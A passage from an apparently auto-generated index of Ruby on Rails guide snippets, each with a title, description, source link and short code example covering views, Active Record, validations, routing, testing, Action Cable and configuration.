2010\n```\n\n----------------------------------------\n\nTITLE: ERB Template Displaying Book Properties\nDESCRIPTION: ERB template to display a list of books with their titles and content in a table. Includes links to show, edit, and destroy each book. Uses Rails helper methods for creating links.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_4\n\nLANGUAGE: html+erb\nCODE:\n```\n<h1>Listing Books</h1>\n\n<table>\n  <thead>\n    <tr>\n      <th>Title</th>\n      <th>Content</th>\n      <th colspan=\"3\"></th>\n    </tr>\n  </thead>\n\n  <tbody>\n    <% @books.each do |book| %>\n      <tr>\n        <td><%= book.title %></td>\n        <td><%= book.content %></td>\n        <td><%= link_to \"Show\", book %></td>\n        <td><%= link_to \"Edit\", edit_book_path(book) %></td>\n        <td><%= link_to \"Destroy\", book, data: { turbo_method: :delete, turbo_confirm: \"Are you sure?\" } %></td>\n      </tr>\n    <% end %>\n  </tbody>\n</table>\n\n<br>\n\n<%= link_to \"New book\", new_book_path %>\n```\n\n----------------------------------------\n\nTITLE: Attempting to Modify a readonly Association\nDESCRIPTION: Shows how attempting to save a readonly association will raise an ActiveRecord::ReadOnlyRecord error, demonstrating the practical effect of the readonly option.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_122\n\nLANGUAGE: ruby\nCODE:\n```\n@book.author = Author.first\n@book.author.save! # This will raise an ActiveRecord::ReadOnlyRecord error\n```\n\n----------------------------------------\n\nTITLE: Setting Custom Console Class - Ruby\nDESCRIPTION: This snippet demonstrates how to set the class to be used as the console when running `bin/rails console`. The configuration is done within the `console` block, which is executed only when running the console. In this example, `pry` is required, and the console is set to `Pry`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nconsole do\n  # this block is called only when running console,\n  # so we can safely require pry here\n  require \"pry\"\n  config.console = Pry\nend\n```\n\n----------------------------------------\n\nTITLE: Example of SQL Statement Documentation Format\nDESCRIPTION: Demonstrates how to format SQL statement examples in documentation. Shows the correct format for displaying generated SQL without using the `=>` prefix notation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\n#   User.where(name: 'Oscar').to_sql\n#   # SELECT \"users\".* FROM \"users\"  WHERE \"users\".\"name\" = 'Oscar'\n```\n\n----------------------------------------\n\nTITLE: Configuring Secret Token and Secret Key Base in Rails 4.0\nDESCRIPTION: Configuration for the secret_token and new secret_key_base in Rails 4.0. The new secret_key_base is used for encrypted cookies, while maintaining the secret_token allows for backward compatibility with Rails 3.x.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_93\n\nLANGUAGE: ruby\nCODE:\n```\n# config/initializers/secret_token.rb\nMyapp::Application.config.secret_token = \"existing secret token\"\nMyapp::Application.config.secret_key_base = \"new secret key base\"\n```\n\n----------------------------------------\n\nTITLE: Rebroadcasting Chat Message Ruby\nDESCRIPTION: This Ruby code implements rebroadcasting of messages received by the server to other connected clients. The receive method takes data from a client and rebroadcasts it to the same chat channel, ensuring all clients connected to the channel receive the message.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_19\n\nLANGUAGE: Ruby\nCODE:\n```\n# app/channels/chat_channel.rb\nclass ChatChannel < ApplicationCable::Channel\n  def subscribed\n    stream_from \"chat_#{params[:room]}\"\n  end\n\n  def receive(data)\n    ActionCable.server.broadcast(\"chat_#{params[:room]}\", data)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Illustrating Callback Execution in IRB\nDESCRIPTION: An Interactive Ruby (IRB) session demonstrating the execution of the previously defined `after_create` callback. When `User.create` is successfully executed (assuming validations pass), the `log_new_user` method runs, printing the message \"A new user was registered\" to the console.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_24\n\nLANGUAGE: irb\nCODE:\n```\nirb> @user = User.create\nA new user was registered\n```\n\n----------------------------------------\n\nTITLE: Retrieving a record using take in Rails\nDESCRIPTION: This code demonstrates how to retrieve a single record from the `Customer` model using the `take` method. It fetches a record without any specific ordering. The `take` method does not raise an exception if no record is found; it returns `nil` instead.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_14\n\nLANGUAGE: irb\nCODE:\n```\nirb> customer = Customer.take\n=> #<Customer id: 1, first_name: \"Lifo\">\n```\n\n----------------------------------------\n\nTITLE: Defining a Custom Sign-In Helper in Rails\nDESCRIPTION: This code snippet defines a custom helper module `SignInHelper` with a method `sign_in_as` that performs a POST request to the sign-in URL with user credentials. It then includes this helper in `ActionDispatch::IntegrationTest` to make it available in integration tests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_73\n\nLANGUAGE: ruby\nCODE:\n```\n# test/test_helper.rb\n\nmodule SignInHelper\n  def sign_in_as(user)\n    post sign_in_url(email: user.email, password: user.password)\n  end\nend\n\nclass ActionDispatch::IntegrationTest\n  include SignInHelper\nend\n```\n\n----------------------------------------\n\nTITLE: Implementing validates_with for Class-based Validation in Ruby on Rails\nDESCRIPTION: This example shows how to use validates_with to delegate validation to a separate validator class. The AddressValidator checks if house_number, street, and postcode are present.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_39\n\nLANGUAGE: ruby\nCODE:\n```\nclass AddressValidator < ActiveModel::Validator\n  def validate(record)\n    if record.house_number.blank?\n      record.errors.add :house_number, \"is required\"\n    end\n\n    if record.street.blank?\n      record.errors.add :street, \"is required\"\n    end\n\n    if record.postcode.blank?\n      record.errors.add :postcode, \"is required\"\n    end\n  end\nend\n\nclass Invoice < ApplicationRecord\n  validates_with AddressValidator\nend\n```\n\n----------------------------------------\n\nTITLE: Using `flash.keep` for Multiple Redirects - Ruby\nDESCRIPTION: This code demonstrates using `flash.keep` to persist flash values across multiple redirects. By calling `flash.keep` in the `index` action, any flash values set in previous actions will be available even after redirecting to `users_url`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_31\n\nLANGUAGE: ruby\nCODE:\n```\nclass MainController < ApplicationController\n  def index\n    # Will persist all flash values.\n    flash.keep\n\n    # You can also use a key to keep only some kind of value.\n    # flash.keep(:notice)\n    redirect_to users_url\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using Form Helpers with Blocks in Rails 3.0\nDESCRIPTION: Example showing the updated syntax for form_for helpers that insert content from a block, which now use <%= instead of <% for the opening tag. This pattern applies to all helpers that return content from a block.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_0_release_notes.md#2025-04-23_snippet_9\n\nLANGUAGE: html+erb\nCODE:\n```\n<%= form_for @post do |f| %>\n  ...\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Adding Object Values to Permitted Set with presence_in - Ruby\nDESCRIPTION: Provides Object#presence_in, enabling succinct checking if a given value is present in a set (Array, Hash, etc.), returning the value if present and not blank or nil. Useful for parameter validation. Needs ActiveSupport core extensions. Inputs are objects and arrays; outputs are the object if present, else nil.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_20\n\nLANGUAGE: Ruby\nCODE:\n```\noption = 'foo'\noption.presence_in(%w(foo bar)) # => 'foo'\n'nil'.presence_in(nil) # => nil\n```\n\n----------------------------------------\n\nTITLE: Handling CSRF Token Errors in Rails Controller\nDESCRIPTION: This Ruby code shows how to rescue from InvalidAuthenticityToken exceptions in a Rails application. It defines a custom handler that signs out the user when a CSRF token is invalid or missing, clearing persistent cookies for additional security.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\nrescue_from ActionController::InvalidAuthenticityToken do |exception|\n  sign_out_user # Example method that will destroy the user cookies\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Application After Initialization - Ruby\nDESCRIPTION: This snippet shows how to configure the application after Rails has finished initializing by using the `config.after_initialize` block. This is particularly useful for modifying values set by other initializers, such as removing the \"div\" tag from the sanitized allowed tags in ActionView.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.after_initialize do\n  ActionView::Base.sanitized_allowed_tags.delete \"div\"\nend\n```\n\n----------------------------------------\n\nTITLE: Using validates_each for Custom Attribute Validation in Ruby on Rails\nDESCRIPTION: This code demonstrates how to use validates_each to validate multiple attributes against a custom block condition. In this example, it validates that name and surname must start with an uppercase letter.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_38\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates_each :name, :surname do |record, attr, value|\n    record.errors.add(attr, \"must start with upper case\") if /\\A[[:lower:]]/.match?(value)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Autoloading Lib Directory with Ignore - Ruby\nDESCRIPTION: This snippet demonstrates how to add the `lib` directory to `config.autoload_paths` and `config.eager_load_paths` while ignoring specified subdirectories. The `ignore` keyword argument specifies the names of subdirectories within `lib` that should not be autoloaded or eager loaded.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.autoload_lib(ignore: %w(assets tasks generators))\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Adapter with SSL (YAML)\nDESCRIPTION: This YAML code configures the Redis adapter to use SSL/TLS connections, including the CA certificate file path. It provides a sample configuration to ensure a secure connection to the redis server. This configuration also supports skipping certificate checks with `VERIFY_NONE`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_27\n\nLANGUAGE: YAML\nCODE:\n```\nproduction:\n  adapter: redis\n  url: rediss://10.10.3.153:tls_port\n  channel_prefix: appname_production\n  ssl_params:\n    ca_file: \"/path/to/ca.crt\"\n```\n\n----------------------------------------\n\nTITLE: Allowing Destruction of Associated Objects in Rails\nDESCRIPTION: This Ruby code snippet shows how to enable the deletion of associated `Address` records when using nested attributes. `allow_destroy: true` is passed to `accepts_nested_attributes_for`, enabling the `_destroy` attribute to be used for marking records for deletion.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_82\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  has_many :addresses\n  accepts_nested_attributes_for :addresses, allow_destroy: true\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Yaffle ActsAsYaffle Module Boilerplate - Ruby Module - Ruby\nDESCRIPTION: Defines a Ruby module Yaffle::ActsAsYaffle that will encapsulate class and instance methods to be reused in models. This blank module serves as a namespace for further extension. Requires being required and included in the appropriate context.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\n# yaffle/lib/yaffle/acts_as_yaffle.rb\n\nmodule Yaffle\n  module ActsAsYaffle\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Overriding Connection Pool Settings\nDESCRIPTION: This snippet demonstrates how to override default connection pool settings, specifically setting the `:size` and `:timeout` options within the `:pool` option for MemCacheStore.  `:size` defines the max connections per process, `:timeout` defines seconds to wait.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_36\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.cache_store = :mem_cache_store, \"cache.example.com\", { pool: { size: 32, timeout: 1 } }\n```\n\n----------------------------------------\n\nTITLE: Using `flash.now` for Same-Request Flash - Ruby\nDESCRIPTION: This example shows how to use `flash.now` to make flash values available in the same request.  This is useful when rendering a template directly (e.g., when a form submission fails) without a redirect.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_32\n\nLANGUAGE: ruby\nCODE:\n```\nclass ClientsController < ApplicationController\n  def create\n    @client = Client.new(client_params)\n    if @client.save\n      # ...\n    else\n      flash.now[:error] = \"Could not save client\"\n      render action: \"new\"\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Example Payload for write_fragment.action_controller Caching Hook in Ruby\nDESCRIPTION: Shows an example Ruby Hash payload for the `write_fragment.action_controller` caching notification. This event is triggered when a Rails application writes a fragment to the cache store. The payload primarily includes the `:key` used for the cache entry, which uniquely identifies the cached fragment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  key: 'posts/1-dashboard-view'\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Primary Key in ActiveRecord Associations\nDESCRIPTION: Shows how to use the :primary_key option to specify a non-standard primary key for associations. This example uses 'guid' instead of 'id' as the primary key for User model and configures Todo to reference this column.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_110\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  self.primary_key = \"guid\" # Sets the primary key to guid instead of id\nend\n\nclass Todo < ApplicationRecord\n  belongs_to :user, primary_key: \"guid\" # References the guid column in users table\nend\n```\n\n----------------------------------------\n\nTITLE: PostgreSQL Database Configuration\nDESCRIPTION: Example of the generated PostgreSQL database configuration file showing default settings and connection options.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n# PostgreSQL. Versions 9.3 and up are supported.\n#\n# Install the pg driver:\n#   gem install pg\n# On macOS with Homebrew:\n#   gem install pg -- --with-pg-config=/opt/homebrew/bin/pg_config\n# On Windows:\n#   gem install pg\n#       Choose the win32 build.\n#       Install PostgreSQL and put its /bin directory on your path.\n#\n# Configure Using Gemfile\n# gem \"pg\"\n#\ndefault: &default\n  adapter: postgresql\n  encoding: unicode\n\n  # For details on connection pooling, see Rails configuration guide\n  # https://guides.rubyonrails.org/configuring.html#database-pooling\n  pool: <%= ENV.fetch(\"RAILS_MAX_THREADS\") { 5 } %>\n\ndevelopment:\n  <<: *default\n  database: petstore_development\n...\n```\n\n----------------------------------------\n\nTITLE: Conditionally Implementing Behavior Based on Configuration in Ruby\nDESCRIPTION: Illustrates how to use a framework configuration flag (`ActiveJob.existing_behavior`) within a method (`changed_method`) to switch between the old (existing) behavior and the new behavior. This allows applications to opt-in or opt-out of the breaking change via configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_35\n\nLANGUAGE: ruby\nCODE:\n```\ndef changed_method\n  if ActiveJob.existing_behavior\n    # Existing behavior\n  else\n    # New behavior\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Defining an Active Job with custom parent class\nDESCRIPTION: This code defines an Active Job that inherits from a custom class named `PaymentJob`. It sets the queue to `default` and defines the `perform` method which will contain the job's logic. The `perform` method accepts a variable number of arguments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProcessPaymentJob < PaymentJob\n  queue_as :default\n\n  def perform(*args)\n    # Do something later\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Testing Delete Action - Ruby\nDESCRIPTION: This Ruby code demonstrates testing the `delete` action of a controller. It retrieves an article fixture, asserts that deleting it decreases the article count by one, and then verifies that the user is redirected to the articles index page. The `articles(:one)` fixture is required.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_51\n\nLANGUAGE: ruby\nCODE:\n```\ntest \"should delete article\" do\n  article = articles(:one)\n  assert_difference(\"Article.count\", -1) do\n    delete article_url(article)\n  end\n\n  assert_redirected_to articles_path\nend\n```\n\n----------------------------------------\n\nTITLE: Permitting Hash Attributes in Rails\nDESCRIPTION: This code demonstrates how to permit hash attributes with integer keys, often encountered when using `accepts_nested_attributes_for` with `has_many` associations. The attributes are declared as if they were direct children.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\n# To permit the following data:\n# {\"book\" => {\"title\" => \"Some Book\",\n#             \"chapters_attributes\" => { \"1\" => {\"title\" => \"First Chapter\"},\n#                                        \"2\" => {\"title\" => \"Second Chapter\"}}}}\n\nparams.expect(book: [ :title, chapters_attributes: [[ :title ]] ])\n```\n\n----------------------------------------\n\nTITLE: Defining a Custom Helper Generator in Ruby\nDESCRIPTION: Provides the Ruby code for the custom `Rails::MyHelperGenerator`. It inherits from `Rails::Generators::NamedBase` and defines a `create_helper_file` method that uses `create_file` to generate a simple helper module file in `app/helpers/`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\nclass Rails::MyHelperGenerator < Rails::Generators::NamedBase\n  def create_helper_file\n    create_file \"app/helpers/#{file_name}_helper.rb\", <<~RUBY\n      module #{class_name}Helper\n        # I'm helping!\n      end\n    RUBY\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Assigning Associated Object via association= - Ruby\nDESCRIPTION: Assigns an Author object to a Book instance. This sets the book's foreign key to the author object's primary key, but does not persist any changes to the database until a save operation is performed. Assumes valid ActiveRecord models.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\n@book.author = @author\n```\n\n----------------------------------------\n\nTITLE: Using 'up' and 'down' Methods in Rails Migrations\nDESCRIPTION: This snippet shows the usage of 'up' and 'down' methods as an alternative to 'change' method in Rails migrations. It changes the 'price' column type from integer to string when migrating up and from string to integer when migrating down.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_56\n\nLANGUAGE: ruby\nCODE:\n```\nclass ChangeProductsPrice < ActiveRecord::Migration[8.1]\n  def up\n    change_table :products do |t|\n      t.change :price, :string\n    end\n  end\n\n  def down\n    change_table :products do |t|\n      t.change :price, :integer\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using the Uniqueness Validator with Scope in Rails (Ruby)\nDESCRIPTION: Demonstrates using the `:scope` option with the `uniqueness` validator in a `Holiday` model. This ensures that the `name` attribute is unique only within the scope of a specific `year`. A custom error message is also provided.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_34\n\nLANGUAGE: ruby\nCODE:\n```\nclass Holiday < ApplicationRecord\n  validates :name, uniqueness: { scope: :year,\n    message: \"should happen once per year\" }\nend\n```\n\n----------------------------------------\n\nTITLE: Displaying Sender Name with Email Using email_address_with_name (Ruby)\nDESCRIPTION: Sets the default from address for outgoing emails in a mailer using the email_address_with_name helper to include a display name along with an email address for sender headers. Supports proper formatting and avoids duplicated addresses if name is blank.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_30\n\nLANGUAGE: ruby\nCODE:\n```\nclass UserMailer < ApplicationMailer\n  default from: email_address_with_name(\"notification@example.com\", \"Example Company Notifications\")\nend\n```\n\n----------------------------------------\n\nTITLE: Generating a Token for Unsubscribing - Ruby\nDESCRIPTION: This code adds the `generates_token_for :unsubscribe` declaration to the Subscriber model. This enables the generation of unique tokens associated with the `:unsubscribe` purpose. These tokens can be used to securely identify subscribers and prevent unauthorized unsubscriptions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_115\n\nLANGUAGE: ruby\nCODE:\n```\nclass Subscriber < ApplicationRecord\n  belongs_to :product\n  generates_token_for :unsubscribe\nend\n```\n\n----------------------------------------\n\nTITLE: Conditional Logic with local_assigns in Rails\nDESCRIPTION: This example demonstrates a use case for `local_assigns`: conditionally rendering a hidden field based on whether a local variable (`:redirect`) has been set. If the local variable `redirect` is present, a hidden field with a value of true is rendered.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_16\n\nLANGUAGE: html+erb\nCODE:\n```\n<% if local_assigns[:redirect] %>\n  <%= form.hidden_field :redirect, value: true %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Setting Up an ActsAsYaffle Unit Test - MiniTest - Ruby\nDESCRIPTION: Defines an empty ActiveSupport::TestCase subclass for testing ActsAsYaffle functionality. This provides a starting point for later writing tests on the plugin's association with models. Requires ActiveSupport and test_helper support files.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\n# yaffle/test/acts_as_yaffle_test.rb\n\nrequire \"test_helper\"\n\nclass ActsAsYaffleTest < ActiveSupport::TestCase\nend\n```\n\n----------------------------------------\n\nTITLE: Shallow Nesting Routes with :shallow Option\nDESCRIPTION: This snippet showcases shallow nesting using the `:shallow` option. It achieves the same result as the previous example but with a more concise syntax. It defines nested routes for comments within articles, automatically making the member actions shallow.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nresources :articles do\n  resources :comments, shallow: true\nend\n```\n\n----------------------------------------\n\nTITLE: Integration Test: Testing Email Delivery (Ruby)\nDESCRIPTION: This integration test checks if an email is delivered when the `invite_friend_url` is posted to with an email parameter. It uses `assert_emails` to verify that the number of delivered emails increases by 1 after the post request.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_100\n\nLANGUAGE: ruby\nCODE:\n```\n# Integration Test\nrequire \"test_helper\"\n\nclass UsersControllerTest < ActionDispatch::IntegrationTest\n  test \"invite friend\" do\n    # Asserts the difference in the ActionMailer::Base.deliveries\n    assert_emails 1 do\n      post invite_friend_url, params: { email: \"friend@example.com\" }\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Getting Help for Rails Plugin Generation - Rails CLI - Bash\nDESCRIPTION: This command displays help options and usage information for the 'rails plugin new' command. It is useful for learning available flags and configuration possibilities when generating a new plugin. Requires only a Rails installation and Bash shell.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ rails plugin new --help\n```\n\n----------------------------------------\n\nTITLE: Enabling Strict Loading on a Record Instance in Rails\nDESCRIPTION: Demonstrates using `strict_loading!` on an instance to prevent lazy loading of associations.  It will raise an `ActiveRecord::StrictLoadingViolationError` if a lazy load is attempted, and can be configured to only raise on potential N+1 queries with the `:mode` option.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_158\n\nLANGUAGE: ruby\nCODE:\n```\nuser = User.first\nuser.strict_loading!\nuser.address.city # raises an ActiveRecord::StrictLoadingViolationError\nuser.comments.to_a # raises an ActiveRecord::StrictLoadingViolationError\n```\n\n----------------------------------------\n\nTITLE: Choosing Layouts at Runtime in Rails\nDESCRIPTION: This code demonstrates how to dynamically choose a layout at runtime using a symbol or a Proc. The example shows selecting a layout based on a user's special status. It shows how to use Proc objects to determine the layout based on the current request.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProductsController < ApplicationController\n  layout :products_layout\n\n  def show\n    @product = Product.find(params[:id])\n  end\n\n  private\n    def products_layout\n      @current_user.special? ? \"special\" : \"products\"\n    end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProductsController < ApplicationController\n  layout Proc.new { |controller| controller.request.xhr? ? \"popup\" : \"application\" }\nend\n```\n\n----------------------------------------\n\nTITLE: S3 CORS Configuration for Active Storage Direct Uploads\nDESCRIPTION: JSON configuration for AWS S3 Cross-Origin Resource Sharing (CORS) that allows direct uploads from a specific origin. This configuration specifies allowed headers, methods, origins, and cache duration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_67\n\nLANGUAGE: json\nCODE:\n```\n[\n  {\n    \"AllowedHeaders\": [\n      \"Content-Type\",\n      \"Content-MD5\",\n      \"Content-Disposition\"\n    ],\n    \"AllowedMethods\": [\n      \"PUT\"\n    ],\n    \"AllowedOrigins\": [\n      \"https://www.example.com\"\n    ],\n    \"MaxAgeSeconds\": 3600\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: SQL for Accessing Associated Order\nDESCRIPTION: This snippet displays the SQL query generated when accessing an associated `Order` record from a `Book` record. It demonstrates that Rails, by default, only uses the `:id` column from the composite primary key in the `WHERE` clause, assuming that the `:id` column is unique.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_9\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM orders WHERE id = 2\n```\n\n----------------------------------------\n\nTITLE: Hash Symbolize Keys Ruby\nDESCRIPTION: The `symbolize_keys` method creates a new hash where all keys are symbols. The `symbolize_keys!` method modifies the hash in place. This allows safe access to hash keys passed as strings or symbols. Deep versions handle nested hashes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_130\n\nLANGUAGE: ruby\nCODE:\n```\n{ nil => nil, 1 => 1, \"a\" => \"a\" }.symbolize_keys\n# => {nil=>nil, 1=>1, :a=>\"a\"}\n```\n\nLANGUAGE: ruby\nCODE:\n```\n{ \"a\" => 1, a: 2 }.symbolize_keys\n# => {:a=>2}\n```\n\nLANGUAGE: ruby\nCODE:\n```\ndef rich_textarea_tag(name, value = nil, options = {})\n  options = options.symbolize_keys\n\n  options[:input] ||= \"trix_input_#{ActionText::TagHelper.id += 1}\"\n  # ...\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n{ nil => nil, 1 => 1, \"nested\" => { \"a\" => 3, 5 => 5 } }.deep_symbolize_keys\n# => {nil=>nil, 1=>1, nested:{a:3, 5=>5}}\n```\n\n----------------------------------------\n\nTITLE: YAML Translations with Keys that Need Escaping\nDESCRIPTION: Example YAML configuration demonstrating how to properly escape certain keywords (true, on, yes, false, off, no) when used as translation keys.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_20\n\nLANGUAGE: yaml\nCODE:\n```\n# config/locales/en.yml\nen:\n  success:\n    'true':  'True!'\n    'on':    'On!'\n    'false': 'False!'\n  failure:\n    true:    'True!'\n    off:     'Off!'\n    false:   'False!'\n```\n\n----------------------------------------\n\nTITLE: Customizing Validation Error Messages in Ruby on Rails\nDESCRIPTION: This example demonstrates different ways to customize validation error messages. It shows using a static message, a dynamic message with placeholders, and interpolation of attribute values.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_46\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  # Hard-coded message\n  validates :name, presence: { message: \"must be given please\" }\n\n  # Message with dynamic attribute value. %{value} will be replaced\n  # with the actual value of the attribute. %{attribute} and %{model}\n  # are also available.\n  validates :age, numericality: { message: \"%{value} seems wrong\" }\nend\n```\n\n----------------------------------------\n\nTITLE: Running Action Cable as a Standalone Server\nDESCRIPTION: This snippet demonstrates how to run Action Cable as a standalone server. It requires a `config.ru` file to define the Rack application and uses Puma to start the server on a specified port.  It also demonstrates how to configure Rails to connect to the standalone server.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_33\n\nLANGUAGE: ruby\nCODE:\n```\n# cable/config.ru\nrequire_relative \"../config/environment\"\nRails.application.eager_load!\n\nrun ActionCable.server\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle exec puma -p 28080 cable/config.ru\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# config/environments/development.rb\nRails.application.configure do\n  config.action_cable.mount_path = nil\n  config.action_cable.url = \"ws://localhost:28080\" # use wss:// in production\nend\n```\n\n----------------------------------------\n\nTITLE: Installing Ruby Gem Dependencies with Bundler\nDESCRIPTION: Commands to install gem dependencies for Rails development with Bundler, including an option to exclude database-related gems.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/development_dependencies_install.md#2025-04-23_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle install\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle config set without db\n$ bundle install\n```\n\n----------------------------------------\n\nTITLE: Migration File Content\nDESCRIPTION: This code defines a migration that creates a `products` table with a `name` column of type `string` and `created_at` and `updated_at` timestamps. This migration specifies how to modify the database schema.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nclass CreateProducts < ActiveRecord::Migration[8.1]\n  def change\n    create_table :products do |t|\n      t.string :name\n\n      t.timestamps\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Create Rails Database\nDESCRIPTION: This command creates the application's database as configured in the `config/database.yml` file. It initializes the database schema and sets up the necessary tables. Requires a database server (e.g., PostgreSQL, MySQL) to be running and properly configured.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:create\n```\n\n----------------------------------------\n\nTITLE: find_by with ID column on models with composite primary keys\nDESCRIPTION: This code demonstrates the behavior of `find_by(id:)` on models with composite primary keys. It shows that Active Record will search for a record with an `:id` column of _either_ of the primary key values and may return the wrong record.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_39\n\nLANGUAGE: irb\nCODE:\n```\nirb> customer = Customer.last\n=> #<Customer id: 10, store_id: 5, first_name: \"Joe\">\nirb> Customer.find_by(id: customer.id) # Customer.find_by(id: [5, 10])\n=> #<Customer id: 5, store_id: 